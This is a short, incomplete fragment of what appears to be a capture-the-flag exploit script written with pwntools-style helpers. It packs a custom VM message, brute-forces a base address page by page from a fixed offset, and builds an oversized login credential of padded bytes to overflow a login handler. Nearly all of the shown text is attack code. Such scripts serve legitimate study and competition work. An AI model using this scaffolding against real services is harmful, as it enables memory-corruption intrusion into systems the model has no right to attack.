...
def gen_vm(py):
    len1 = len(py)
    return p32(2, endian='big')+p32(0, endian='big')+p32(len1, endian='big')+py

def get_base(check):
    for base in range(0x0, 0xfffff000, 0x1000):
        init_scmgr = base + 0x18f7
        g_table = [init_scmgr]
        for i in range(31):
...
name_passwd = b'a'*0x150+b':'+b'b'*0x178+b';'
genkey(seed)
pkt = gen_login(name_passwd, p64(0x666, endian='big'))
